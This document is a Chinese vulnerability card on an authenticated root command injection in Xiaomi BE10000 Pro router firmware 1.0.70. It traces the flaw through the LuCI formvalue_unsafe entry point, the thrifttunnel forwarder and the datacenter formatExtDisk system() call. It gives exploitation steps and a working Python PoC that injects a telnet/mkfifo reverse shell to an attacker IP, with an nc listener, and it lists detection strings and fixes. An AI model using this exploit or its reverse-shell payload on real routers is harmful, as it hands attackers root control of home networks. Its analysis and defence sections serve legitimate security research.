---
id: iot-xiaomi-be10000-xqdatacenter-thrifttunnel-command-injection
title: 小米路由器 BE10000 Pro xqdatacenter→thrifttunnel→datacenter 链命令注入（认证后 root RCE）
type: scenario
domain: iot
path: iot
technique: lua-formvalue-unsafe-thrifttunnel-json-format-disk-command-injection
aliases:
- Xiaomi BE10000 Pro
- miwifi_rp04_firmware_85be4_1.0.70.bin
- xqdatacenter
- tunnelRequest
- formvalue_unsafe
- thrifttunnel
- datacenter
- formatExtDisk
- formattedExtDisk
- /usr/sbin/format_disk
- StorageApi::sCallSystem
tags:
- iot
- firmware
- xiaomi
- router
- command-injection
- lua
- luci
- thrift
- post-auth
- root
cve: []
severity: high
confidence: high
status: verified
affected_versions: Xiaomi 路由器 BE10000 Pro 稳定版 1.0.70（2025-10-28 更新，固件 miwifi_rp04_firmware_85be4_1.0.70.bin）
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V144
  verified_at: '2026-11-06T06:01:36+08:00'
  notes: 已对照原文与11张图核对：固件 miwifi_rp04_firmware_85be4_1.0.70.bin；xqdatacenter.lua 的 http.formvalue_unsafe(payload)+binaryBase64Enc+THRIFT_TUNNEL_TO_DATACENTER="thrifttunnel 0 '%s'"+util.exec；thrifttunnel case 0 的 api<600||api>700 分流与 127.0.0.1:9090；datacenter sConstructMappingTable api=7→formatExtDisk、dev/vendor/type 非空、/usr/sbin/format_disk 拼接后 CommonUtils::sCallSystem；PoC 与图09-11 的 uid=0(root) 反弹 shell 一致。未验证点：未在真机复跑 PoC；图08 反编译中 dev/vendor/type 实参顺序与原文文字“vendor type dev”的对应存在歧义（注入位于 vendor 且分号截断，不影响利用成立）；既有 AX9000 CVE-2023-26315 同链卡片未在“变体与关联”中链接。
---

## 一句话结论

小米路由器 BE10000 Pro 稳定版 1.0.70 中，已登录用户向 `/cgi-bin/luci/;stok=<token>/api/xqdatacenter/request` 提交 `payload` JSON（`api=7`，`vendor`/`type`/`dev` 带 Shell 元字符），LuCI 用未过滤的 `http.formvalue_unsafe` 取值后拼成 `thrifttunnel 0 '<base64>'` 执行；`thrifttunnel` 把 `api` 不在 600–700 区间的 JSON 转发到本地 `127.0.0.1:9090` 的 `datacenter`，其 `formatExtDisk` 把 `vendor type dev` 无过滤拼进 `/usr/sbin/format_disk ...` 交给 `system`，最终以 root 执行任意命令。

## 原理

链路分四段，每段都把上一段的不可信数据原样传给下一段：

1. **LuCI 入口（Lua）**：`/usr/lib/lua/luci/controller/api/xqdatacenter.lua` 在 `api=request` 时调用 `tunnelRequest()`。该函数用 `http.formvalue_unsafe("payload")` 读取参数——LuCI 中 `formvalue()` 会调用 `hackCheck` 过滤危险字符，而 `formvalue_unsafe()` 不做任何过滤。随后 `XQCryptoUtil.binaryBase64Enc(payload)` 编码，按 `XQConfigs.THRIFT_TUNNEL_TO_DATACENTER`（值为 `"thrifttunnel 0 '%s'"`）格式化，交给 `util.exec()` 执行。
2. **thrifttunnel（C 二进制）**：`main` 检查参数个数为 3，解密传入的 payload，按第一个参数 `0` 进入 `case 0`。它从 JSON 取出 `api`，判断 `(unsigned)(api - 600) > 0x64`，即 `api < 600` 或 `api > 700` 时，调用 `off_3F390` 把原始 JSON 发往 `127.0.0.1:9090`；`api=7` 正好命中该分支。若 `api` 落在 600–700 内则走别的本地处理，不进入 datacenter。
3. **datacenter（本地 9090 服务）**：`StorageApiCollection::sConstructMappingTable` 把 `api=7` 映射到 `formatExtDisk[0]`。`formatExtDisk` 用 `json_object_object_get_ex` / `json_object_get_string` 取出 `dev`、`vendor`、`type` 三个字符串，三者均非空才继续；全程没有过滤或转义。
4. **命令拼接**：`StorageApi::formattedExtDisk` 依次拼接 `"/usr/sbin/format_disk "` + `vendor` + `" "` + `type` + `" "` + `dev`，再调用 `CommonUtils::sCallSystem`（即 `system()`）。`vendor=";ls;id;#"` 时实际执行 `/usr/sbin/format_disk ;ls;id;# a a`，分号截断原命令，`#` 注释掉尾部，任意命令以 `datacenter` 进程权限（root）执行。

**为什么成立**：入口刻意使用 `formvalue_unsafe` 绕过了 LuCI 的字符过滤；`thrifttunnel` 只按 `api` 数值范围分流，不校验 JSON 内容；`datacenter` 信任来自本机 9090 的请求，并把三个字段直接拼进 Shell 命令。整条链没有任何一层做白名单或参数化，最终落到 `system()`。

## 触发条件

- 目标为小米路由器 BE10000 Pro 稳定版 1.0.70（`miwifi_rp04_firmware_85be4_1.0.70.bin`），LuCI Web 管理面可达。
- 攻击者已获得有效 `stok`（管理员登录后的 LuCI 会话令牌），即“授权后”利用；该漏洞不是未授权入口。
- 请求路径 `/cgi-bin/luci/;stok=<token>/api/xqdatacenter/request` 可访问，`payload` 参数可控。
- `thrifttunnel`、`datacenter` 服务正常；`api` 取 7（不在 600–700 区间）以进入 9090 转发分支。
- JSON 中 `dev`、`vendor`、`type` 三个字段都存在且非空。

## 利用步骤

1. 登录路由器管理后台，从 URL 或 Cookie 取得当前会话的 `stok` 值。
2. 构造 `payload` JSON：`{"api":7,"dev":"a","vendor":"<注入命令>","type":"a"}`；注入命令放在 `vendor`（也可放在 `type`/`dev`，因为三者都拼进同一命令行）。
3. POST 到 `http://<router>/cgi-bin/luci/;stok=<token>/api/xqdatacenter/request`，`payload` 作为表单字段提交。
4. 命令执行默认无回显（实测 HTTP 响应为 `{"code":0,"msg":""}`），建议用反弹 Shell 或写文件/带外方式确认；例如 `;mkfifo /tmp/f; telnet <attacker> 8888 0</tmp/f | /bin/sh > /tmp/f;#`，在攻击机 `nc -lvnp 8888` 接收 root Shell。
5. 拿到 Shell 后 `id` 确认 `uid=0(root)`，可读取配置、凭据、修改固件或作为内网跳板。

## PoC

```python
import requests

server_ip = "192.168.122.130"
token = "8981e8c5448573818d53bbdca1bb2357"  # 登录后的 stok

# 反弹 shell（推荐，因命令输出不回显）
shell = ";mkfifo /tmp/f; telnet 192.168.157.134 8888 0</tmp/f | /bin/sh > /tmp/f;#"
# 盲测可用：shell = ";ls;id;#"
data = {'payload': '{"api":7,"dev":"a","vendor":"' + shell + '","type":"a"}'}
res = requests.post(
    "http://{}/cgi-bin/luci/;stok={}/api/xqdatacenter/request".format(server_ip, token),
    data=data,
)
print(res.text)
```

攻击机先监听：`nc -lvnp 8888`。注入后实际执行的命令为：

```text
/usr/sbin/format_disk ;mkfifo /tmp/f; telnet 192.168.157.134 8888 0</tmp/f | /bin/sh > /tmp/f;# a a
```

## 变体与关联

- **字段变体**：`vendor`、`type`、`dev` 三个字段都进入同一命令，任一字段都可注入；`dev` 位于命令末尾，适合用 `#` 截断。
- **api 值变体**：`thrifttunnel` 的分流条件是 `api < 600 || api > 700`；除 7 外，其他不在 600–700 的 `api` 值也会把 JSON 转发到 9090，具体落到哪个 handler 取决于 datacenter 的映射表。
- **本地服务面**：`datacenter` 监听 `127.0.0.1:9090`，`formatExtDisk` 是无鉴权命令注入 sink；若存在其他可向本机 9090 发送 JSON 的入口（SSRF、其他本地代理/隧道程序），可单独复用该 sink。
- **同类入口**：LuCI 其他 controller 若也使用 `http.formvalue_unsafe` 拼接 `util.exec`，可能存在类似注入；排查时搜索 `formvalue_unsafe` 与 `util.exec`/`os.execute` 的组合。
- **关联卡片**：[[iot-firmware-boa-pin-command-injection]]（嵌入式 Web 参数拼 `system` 的同类命令注入）、[[iot-ipc-json-rpc-mp-rate-command-injection]]（JSON RPC 字段拼命令）、[[code-analysis-reverse-firmware-huawei-squashfs-mips-emulation]]（固件解包/仿真方法）。

## 检测与防御

- **检测**：LuCI/Web 日志中出现 `/api/xqdatacenter/request` 且 `payload` 含 `;`、`|`、`&&`、`$(`、反引号、`/bin/sh`、`telnet`、`mkfifo` 等；进程树出现 `luci`/`uhttpd` → `sh -c thrifttunnel 0 ...` → `datacenter` → `format_disk` 的异常调用；路由器主动外连非常规端口；`/tmp` 出现 fifo 或临时脚本。
- **防御**：把 `http.formvalue_unsafe` 改为带 `hackCheck` 的 `formvalue`，并对 `payload` 做严格 JSON Schema 校验；`api` 使用白名单而非数值区间；`thrifttunnel` 对转发到 datacenter 的 JSON 做字段校验；`formatExtDisk` 不要用字符串拼接 + `system`，改用 `execve`/`posix_spawn` 传 argv，且 `dev` 必须是已挂载设备路径白名单、`vendor`/`type` 只允许已知枚举；`datacenter` 限制仅本机特定 UID 可访问，并以最小权限运行；及时升级官方修复固件。
